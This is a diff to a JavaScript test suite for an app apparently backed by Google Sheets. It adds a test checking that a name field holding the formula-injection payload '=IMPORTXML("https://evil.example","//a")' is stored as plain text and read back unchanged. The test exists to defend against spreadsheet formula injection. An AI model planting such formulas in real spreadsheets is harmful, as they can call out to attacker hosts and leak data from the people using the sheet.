@@ -355,6 +355,14 @@ denied(call(SUP, 'conversos.delete', { id: c2.id }), 'BAD_INPUT') // needs confi
 const certRows = [...s.spreadsheets.values()][0]._sheets.get('Certificados')._data.slice(1)
 assert.ok(certRows.every((row) => row[7] === '{}' && row[8] === 'anulado'))
 
+// --- text that looks like a formula is stored as plain text and read back unchanged
+const evil = ok(call(SUP, 'conversos.create', { data: base({ nombres: '=IMPORTXML("https://evil.example","//a")', whatsapp: '11 4545 4545' }) }))
+const rawRow = [...s.spreadsheets.values()][0]._sheets.get('Conversos')._data.find((row) => row[0] === evil.id)
+assert.ok(rawRow[1].startsWith("'="), 'kept as text in the sheet')
+assert.ok(rawRow[11].startsWith("'+"), 'the + of the phone survives')
+assert.equal(ok(call(SUP, 'conversos.get', { id: evil.id })).converso.nombres, '=IMPORTXML("https://evil.example","//a")')
+assert.equal(ok(call(SUP, 'conversos.get', { id: evil.id })).converso.whatsapp, '+5491145454545')
+
 // --- settings
 denied(call(SUP, 'settings.save', { invitacionDias: '90' }), 'BAD_INPUT')
 assert.equal(ok(call(SUP, 'settings.save', { orgName: 'Mezquita de prueba', foo: 'bar' })).foo, undefined)
